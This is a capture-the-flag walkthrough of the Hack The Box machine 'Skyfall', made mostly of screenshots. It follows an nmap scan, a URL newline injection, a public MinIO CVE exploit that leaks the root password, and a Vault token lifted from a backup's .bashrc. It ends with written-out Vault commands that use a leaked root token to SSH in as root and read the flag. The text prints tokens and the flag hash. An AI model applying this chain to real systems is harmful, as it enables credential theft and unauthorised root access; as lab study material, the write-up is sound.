tags:: #hackthebox 

### Skyfall 🗃

![Pasted image 20240205173101](https://github.com/user-attachments/assets/1747d486-7a0c-4ca0-ad78-d292107c3358)


Let's get started...

---
### Steps
1.  **Start your vpn**
	Go to the directory where your downloaded vpn and start the vpn as shown below
	
![Pasted image 20240205174449](https://github.com/user-attachments/assets/bdba2db5-32a6-44cf-8160-6ce0f9b4e59d)


2. Run an nmap scan on the host:
![[Pasted image 20240205173906.png]]

┌──(kali㉿kali)-[~]
└─$  sudo nmap -sC -sV 10.10.11.254
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2024-02-05 17:22 EST
Nmap scan report for skyfall.htb (10.10.11.254)
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.22 seconds

┌──(kali㉿kali)-[~]
└─$ 

3. Added the ip with the corresponding name in the /etc/hosts file:

4. Visited skylab.htb in the browser:
![Pasted image 20240205174449](https://github.com/user-attachments/assets/1e7abea0-c1a1-4008-8f79-fa34324fdf2a)


5. viewed the source code to see if we can anything. So we happen to find this URL while reviewing the code:

![Pasted image 20240205175505](https://github.com/user-attachments/assets/309c9d41-7fd2-417d-bc4e-2780636221d9)


6. We will also add the URL to our /etc/hosts file:

7. Navigated to the site:

![Pasted image 20240205175755](https://github.com/user-attachments/assets/ff492249-93b6-4b46-970b-4ea3d4d5764b)


![Pasted image 20240205180016](https://github.com/user-attachments/assets/8e361b93-caa1-40f8-88aa-ac98530b55f0)


9. So, we try to use the username and password to login for a demo as provided on the form:

![Pasted image 20240205180203](https://github.com/user-attachments/assets/670fdb2e-4c64-482d-965e-469a80ef52c4)


10. After clicking on MimIO Metrics tab, I got this:

![Pasted image 20240205182739](https://github.com/user-attachments/assets/34728722-cc1b-4425-a4b7-e43d7ec5c89d)


11. So, I went ahead to enter this %0a and got the following result page:
    http://demo.skyfall.htb/metrics%0a

![Pasted image 20240205184040](https://github.com/user-attachments/assets/5629d1e2-31f2-49ee-bf84-a7d48966b74f)


Notice on the last line a URL for demo.skylab.htb

![Pasted image 20240205185625](https://github.com/user-attachments/assets/6fe909ca-d1aa-4134-8d5f-c8e39a18f2a8)


11. Added this to the /etc/hosts file:

![Pasted image 20240205185448](https://github.com/user-attachments/assets/d88bc0ff-06ac-4825-800a-4b8342364800)


12. I decided to visit this page for a potential Mimio CVE on github:

![Pasted image 20240205190652](https://github.com/user-attachments/assets/8af3fdbe-8c5c-424d-bf80-7722b5ed649d)


13. Clicking on CVE-3035-28432.py exploit to view the script:

![Pasted image 20240205191747](https://github.com/user-attachments/assets/afd533a5-d225-446e-9a48-27627be66d3f)

14. Launched Burpsuite and copy the URL to the browse saved in the /etc/hosts file prd23-s3-backend.skyfall.htb/:

![Pasted image 20240205192226](https://github.com/user-attachments/assets/d47fc6f1-e78b-4141-8d6f-16e972cc5a4b)


15. Now, go back to the resporsitory and get the target URL as highlighted earlier:

![Pasted image 20240205194154](https://github.com/user-attachments/assets/525970c0-ad4b-44f4-bc2a-2b9aca44cada)


16. In Burpsuite I am able to manipulate the request in Repeater tab and Send it back to the server:

![Pasted image 20240205221331](https://github.com/user-attachments/assets/36cb4d1a-312e-4ab1-bf96-868d4dff15c3)


We can see the MINIO ROOT PASSWORD in the response field:

![[Pasted image 20240205221838.png]]

17. Download the Minio client:

![Pasted image 20240205221838](https://github.com/user-attachments/assets/fb169db8-47d9-4be6-8819-f072ed5da7f8)

![Pasted image 20240205223804](https://github.com/user-attachments/assets/66d43ca5-da87-484a-a61b-2e6436481c83)


![Pasted image 20240205230212](https://github.com/user-attachments/assets/5f87811b-be84-479b-9ed9-f104197716cc)


18. Added the myminio alias for your MinIO server using the `mc` command. Now I can proceed with MinIO client operations on the MinIO server using this alias:

![Pasted image 20240205230816](https://github.com/user-attachments/assets/781d3d1c-e170-446c-a7aa-b675fdf7f911)


19. List the buckets:

![Pasted image 20240205231930](https://github.com/user-attachments/assets/170e1661-4eb8-487b-9c9c-4317e4ac923d)


20. Copy the backup file from Mimio server t:

![Pasted image 20240205232447](https://github.com/user-attachments/assets/bf462b62-85b2-4e80-bf8b-2b01622deb08)

![Pasted image 20240205232712](https://github.com/user-attachments/assets/e7412866-15db-4a1c-8d35-6a0e3ec08943)


21. List the contents of the bash configuration file:

![Pasted image 20240205233418](https://github.com/user-attachments/assets/92fc5895-4ba2-47f4-94eb-4d37ccc49277)


![Pasted image 20240205233516](https://github.com/user-attachments/assets/3655a1fa-a4a6-4579-beb3-693362291429)

22. Add the Vault api to the /etc/hosts file together with the other 10.10.11.254 URLs

23. Download the vault client:

kali@kali:~$  wget https://releases.hashicorp.com/vault/1.15.5/vault_1.15.5_linux_amd64.zip

kali@kali:~$  unzip vault_1.15.5_linux_amd64.zip 
Archive:  vault_1.15.5_linux_amd64.zip
  inflating: vault                   
kali@kali:~$

![Pasted image 20240205234621](https://github.com/user-attachments/assets/8d38b680-2043-432d-bdb6-c8dad4fffec8)


![Pasted image 20240206000034](https://github.com/user-attachments/assets/33fda6c6-a05d-4dc6-9373-48f18921d4a5)


24. Now, let's run the export the vault script and run it:

![Pasted image 20240206000939](https://github.com/user-attachments/assets/1710f57d-ed68-4b67-b518-2e1e1ab12348)


25. Enter this token from the .bashrc config file we saw it from:

hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE

![Pasted image 20240206003613](https://github.com/user-attachments/assets/197f5811-856c-4fbb-a8bb-ea40d92a419d)


![Pasted image 20240206004312](https://github.com/user-attachments/assets/d43f3dc6-71b2-4efc-9c9b-224fdb009fa8)


26. Run the command to help SSH into the system via Vault:

![Pasted image 20240206011039](https://github.com/user-attachments/assets/54e34747-ff0c-4725-b8d8-55791fd85122)


27. Listing the files in the user's home directory we could see the user flag and view it:

![Pasted image 20240206011435](https://github.com/user-attachments/assets/f152744f-f4ce-4cf2-9eea-e7ed90f80707)


28. what commands can this user run as sudo without a password:

![Pasted image 20240206014234](https://github.com/user-attachments/assets/6be83610-fc3a-4922-9d87-744d05a1c668)


29. Remove and create back the debug.log file:

![Pasted image 20240206020439](https://github.com/user-attachments/assets/fefeaf3f-1473-4116-a937-b5b344cd5dd7)


30. Now, viewing the contents of the file:

![Pasted image 20240206020641](https://github.com/user-attachments/assets/d7d7f703-8cfe-4e7c-9efb-f3cfd487e3bb)


31. Exiting the process and starting again for the root:

![Pasted image 20240206024119](https://github.com/user-attachments/assets/4f603d47-7fc6-4ed8-a27c-b00439760c60)

![Pasted image 20240206024146](https://github.com/user-attachments/assets/f7880784-17d8-4f56-83ec-fb8153dd9759)


32. Changing the role now to root:

![Pasted image 20240207003210](https://github.com/user-attachments/assets/a4ffb94c-48b0-49c2-9a92-bc7481ad1f62)

![Pasted image 20240207003305](https://github.com/user-attachments/assets/904be151-84ca-49ef-8cec-fecebf5b636f)


Actual commands to get root:

```
kali@kali:~$  export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
kali@kali:~$  ./vault login
Token (will be hidden): 
WARNING! The VAULT_TOKEN environment variable is set! The value of this
variable will take precedence; if this is unwanted please unset VAULT_TOKEN or
update its value accordingly.

Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                hvs.I0ewVsmaKU1SwVZAKR3T0mmG
token_accessor       bXBeXR3r92WGQ8XgEDx6pIFu
token_duration       ∞
token_renewable      false
token_policies       ["root"]
identity_policies    []
policies             ["root"]
kali@kali:~$ export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"
kali@kali:~$ export VAULT_NAMESPACE="root"
kali@kali:~$ ./vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no root@10.10.11.254
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 184643cc-ed2b-7156-e536-8f7762350f66
Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.
```

To restore this content, you can run the 'unminimize' command.
Last login: Tue Jan 30 12:17:37 2024
root@skyfall:~# ls
minio  root.txt  sky_storage  vault
root@skyfall:~# cat root.txt
3b123dc3f82223d5b0586fbed83e93c9
root@skyfall:~#
